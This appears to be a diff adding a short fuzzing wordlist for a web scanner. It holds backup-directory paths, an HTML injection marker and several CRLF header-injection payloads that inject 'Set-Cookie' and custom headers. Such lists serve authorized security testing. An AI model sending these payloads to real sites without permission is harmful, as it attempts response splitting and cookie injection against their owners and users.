@@ -1,0 +1,15 @@
+/backup/
+/index
+/php/backup/
+<h1\>INJECTX</h1\>
+\\nSet-Cookie:crlf
+\\rSet-Cookie:crlf
+\\r\\nSet-Cookie:crlf
+\nSet-Cookie:crlf
+\rSet-Cookie:crlf
+\r\n
+\r\n Header-Test:HacktivistRO
+\r\nHeader-Test:HacktivistRO
+\r\nSet-Cookie:crlf
+crlf\r\nHeader-Test:HacktivistRO
+{{path_to_check}}
